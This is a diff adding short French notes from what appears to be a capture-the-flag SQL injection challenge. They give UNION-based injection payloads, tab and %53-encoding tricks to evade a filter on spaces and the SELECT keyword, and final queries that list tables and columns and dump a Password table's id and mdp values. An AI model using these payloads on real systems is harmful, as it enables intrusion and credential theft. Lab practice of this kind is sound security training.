@@ -1,0 +1,20 @@
+1' union select 1, 2, table_name as USR_NOM from information_schema.tables order by 'table_name
+
+==> alerte pas d'espace
+
+Je remplace par des TABS
+
+1'	union	select	1,	2,	table_name	as	USR_NOM	from	information_schema.tables	order	by	'table_name
+
+==> alerte pas de select ! (le mot clé SELECT est interdit)
+
+je vais remplacer une lettre de SELECT ==> %53ELECT 
+
+
+AU FINAL :
+a) LISTE DES TABLES
+1'	union	%53elect	1,	2,	table_name	as	USR_NOM	from	information_schema.tables	order	by	'table_name
+b) LISTE DES CHAMPS
+1'	UNION	%53ELECT	1,table_name,column_name	FROM	information_schema.columns	where	table_name='Password
+c) valeurs dont le flag
+1'	UNION	%53ELECT	1,id,mdp	FROM	Password	where	id<>'dude
